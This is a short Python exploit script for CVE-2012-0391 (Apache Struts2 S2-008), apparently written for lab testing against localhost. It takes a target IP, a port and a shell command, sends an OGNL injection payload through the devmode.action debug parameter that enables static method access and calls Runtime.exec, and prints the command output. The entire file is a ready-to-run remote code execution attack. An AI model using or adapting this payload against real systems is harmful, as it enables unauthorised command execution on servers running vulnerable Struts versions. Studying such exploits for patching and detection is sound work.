# coding=utf-8
"""
DATE:   2021/12/29
AUTHOR: TesterCC
DESC: CVE-2012-0391 s2-008
"""

import traceback
from optparse import OptionParser

import requests

def attack():
    try:
        usage = "Usage: %prog --ip <host_ip> --port <host_port> --cmd <execute_command>"
        parser = OptionParser(usage=usage)
        parser.add_option('--ip', action="store", dest="ip", help="127.0.0.1")
        parser.add_option('--port', action="store", dest="port", default="8080")
        parser.add_option('--cmd', action="store", dest="cmd", help="ip a")

        options, args = parser.parse_args()
        ip = options.ip
        port = options.port
        cmd = options.cmd

        url = f"http://{ip}:{port}/S2-008/devmode.action?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%29)"

        r = requests.get(url=url)

        if r.status_code == 200:
            print("[+] Attack successful, return info as fellows:")
            print(r.text)

    except Exception:
        print("[-] Attack failed")
        traceback.print_exc()


if __name__ == '__main__':
    # python3 CVE-2012-0391.py --ip 127.0.0.1 --port 8080 --cmd "ls -al"
    # python CVE-2012-0391.py --ip 127.0.0.1 --port 8080 --cmd "touch flag.txt"
    attack()
